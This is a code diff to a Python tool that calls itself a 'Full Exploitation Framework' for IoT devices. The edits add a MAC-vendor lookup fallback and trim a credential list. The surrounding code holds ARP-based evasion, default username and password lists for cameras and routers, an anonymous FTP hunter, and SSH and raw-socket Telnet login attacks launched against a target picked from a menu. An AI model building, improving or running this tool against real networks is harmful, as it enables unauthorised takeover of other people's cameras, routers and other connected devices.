@@ -25,7 +25,7 @@ logging.getLogger("paramiko").setLevel(logging.CRITICAL) # Silence Paramiko's no
 
 def print_banner():
     print("=" * 75)
-    print("IoT-Scanner - Full Exploitation Framework")
+    print(" IoT-Scanner - Full Exploitation Framework")
     print("=" * 75)
 
 # --- MODULE 1: ENVIRONMENT & EVASION ---
@@ -50,6 +50,43 @@ def inject_bypass(gateway_mac, network_hosts):
 def cleanup_bypass(network_hosts):
     for ip in network_hosts:
         os.system(f"arp -d {ip} > /dev/null 2>&1")
+
+# --- MAC & VENDOR FALLBACK MODULE ---
+def get_mac_and_vendor_fallback(ip):
+    """Fallback method to read the Linux ARP cache and query the vendor."""
+    mac_address = "Unknown MAC"
+    vendor_name = "Unknown Vendor"
+
+    # 1. Read the raw Linux ARP table
+    try:
+        with open('/proc/net/arp', 'r') as f:
+            for line in f.readlines():
+                if ip in line:
+                    parts = line.split()
+                    if len(parts) >= 4:
+                        mac_address = parts[3].upper()
+                        break
+    except Exception:
+        pass
+
+    # 2. If we found a MAC, try to resolve the Vendor
+    if mac_address != "Unknown MAC":
+        try:
+            # Query a public MAC vendor database
+            res = requests.get(f"https://api.macvendors.com/{mac_address}", timeout=2.0)
+            if res.status_code == 200:
+                vendor_name = res.text.strip()
+        except Exception:
+            # Local dictionary fallback for common IoT/Router brands if API fails
+            oui = mac_address[:8].upper()
+            known_ouis = {
+                "00:40:66": "Hikvision", "38:AF:29": "Dahua", 
+                "B8:27:EB": "Raspberry Pi", "DC:A6:32": "Raspberry Pi",
+                "00:E0:4C": "Realtek (Generic IoT)", "C8:3A:35": "Tenda"
+            }
+            vendor_name = known_ouis.get(oui, "Unknown Vendor")
+
+    return mac_address, vendor_name
 
 # --- MODULE 2: DEEP DISCOVERY ---
 def check_stealth_port(ip):
@@ -134,8 +171,8 @@ def get_vendor_creds(vendor_name):
         if company.lower() in vendor_name.lower():
             return company, creds
             
-    # If unknown vendor, test the "Big 5" universal defaults
-    return "Unknown", [("admin", "admin"), ("root", "root"), ("root", "admin"),("admin", "admin@123"),("admin", "Admin@123"),("admin", "Admin@123")]
+    # If unknown vendor, test the "Big 3" universal defaults
+    return "Unknown", [("admin", "admin"), ("root", "root"), ("root", "admin")]
 
 # --- MODULE 5: ANONYMOUS SHARE HUNTER (PORT 21) ---
 def hunt_anonymous_ftp(ip):
@@ -179,7 +216,7 @@ def exploit_auth_service(ip, port, vendor_name):
                 client.close()
 
         elif port == 23:
-            # Raw Socket Telnet Attack (Bypasses Python 3.13 telnetlib removal)
+            # Raw Socket Telnet Attack
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(3.0)
@@ -239,7 +276,7 @@ def main():
 
     # DISCOVERY
     discovered_devices = {}
-    print(f"\n[*] Phase 1: 1-Minute Deep Sweep...")
+    print(f"\n[*] Phase 1: Commencing 1-Minute Deep Sweep...")
     
     with ThreadPoolExecutor(max_workers=50) as executor:
         results = executor.map(check_stealth_port, ips_to_check)
@@ -267,7 +304,7 @@ def main():
         counter += 1
     print("-" * 50)
     
-    choice = input("\nEnter Target ID (or 'Q' to quit) > ").strip().upper()
+    choice = input("\nEnter Target ID to Audit (or 'Q' to quit) > ").strip().upper()
     
     if choice == 'Q' or choice not in target_menu:
         if gateway_mac: cleanup_bypass(ips_to_check)
@@ -287,10 +324,20 @@ def main():
     
     if target in nm.all_hosts() and 'tcp' in nm[target]:
         
-        # Hardware Fingerprinting (Grabbing the Vendor for the Sniper)
+        # Hardware Fingerprinting 
         mac_address = nm[target]['addresses'].get('mac', 'Unknown MAC')
         vendor_dict = nm[target].get('vendor', {})
         vendor_name = vendor_dict.get(mac_address, 'Unknown Vendor')
+        
+        # --- THE ARP FALLBACK INJECTION ---
+        if mac_address == 'Unknown MAC' or vendor_name == 'Unknown Vendor':
+            fallback_mac, fallback_vendor = get_mac_and_vendor_fallback(target)
+            if mac_address == 'Unknown MAC':
+                mac_address = fallback_mac
+            if vendor_name == 'Unknown Vendor':
+                vendor_name = fallback_vendor
+        # ----------------------------------
+        
         print(f"\n    [*] Hardware Fingerprint: {mac_address} ({vendor_name})")
         
         for port in nm[target]['tcp']:
@@ -304,9 +351,12 @@ def main():
                 # Nmap NSE Output
                 if 'script' in nm[target]['tcp'][port]:
                     for script_name, output in nm[target]['tcp'][port]['script'].items():
-                        first_line = output.splitlines()[0].strip()
-                        if first_line and "ERROR" not in first_line and "Couldn't find" not in first_line:
-                            print(f"        -> [Nmap Script: {script_name}]: {first_line}")
+                        lines = output.splitlines()
+                        # Safety check: ensure the script actually returned lines of text
+                        if lines: 
+                            first_line = lines[0].strip()
+                            if first_line and "ERROR" not in first_line and "Couldn't find" not in first_line:
+                                print(f"        -> [Nmap Script: {script_name}]: {first_line}")
                 
                 # The Attack Triggers
                 if port == 21:
@@ -324,7 +374,7 @@ def main():
         cleanup_bypass(ips_to_check)
         
     print("\n" + "=" * 75)
-    print(" Complete.")
+    print("Audit Complete.")
     print("=" * 75)
 
 if __name__ == "__main__":
